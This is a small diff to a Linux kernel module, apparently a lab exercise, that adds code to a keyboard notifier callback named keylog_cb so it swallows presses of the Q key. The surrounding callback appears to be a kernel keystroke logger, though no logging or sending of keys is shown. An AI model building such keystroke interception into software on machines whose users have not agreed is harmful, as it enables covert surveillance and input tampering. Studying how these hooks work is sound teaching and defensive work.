@@ -103,6 +103,9 @@ static int keylog_cb(struct notifier_block *nb, unsigned long action, void *data
             }
         }
     /* Part 3 TODO: suppress KEY_Q at KBD_KEYCODE stage */
+        if (action == KBD_KEYCODE && param->down && param->value == KEY_Q) {
+            return NOTIFY_STOP;
+        }
 
     return NOTIFY_OK;
 }
